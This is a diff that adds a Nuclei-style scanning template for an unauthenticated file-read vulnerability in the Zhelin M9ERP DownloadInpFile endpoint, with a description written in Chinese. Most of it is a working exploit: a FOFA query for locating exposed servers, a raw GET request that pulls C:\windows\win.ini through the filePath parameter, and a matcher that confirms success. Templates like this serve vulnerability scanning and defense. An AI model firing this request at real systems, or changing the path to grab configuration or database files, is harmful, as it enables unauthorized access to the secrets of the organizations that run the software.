@@ -1,0 +1,25 @@
+id: zhelin-m9erp-downloadinpfile-lfi
+
+info:
+  name: "哲霖机械 M9ERP DownloadInpFile 接口文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="Api/UserApi/GetUserName"
+      折霖机械M9ERP系统DownloadInpFile接口存在文件访问控制缺陷，攻击者可利用此漏洞在未认证状态下访问并提取关键系统文件（包括但不限于数据库配置文件、系统配置文件等敏感资源），可能造成系统敏感信息泄露及权限突破。该漏洞允许通过构造特定请求路径绕过文件访问限制机制。
+  tags: 哲霖机械
+
+http:
+- raw:
+  - |
+    GET /Basics/DownloadInpFile?filePath=C:\windows\win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
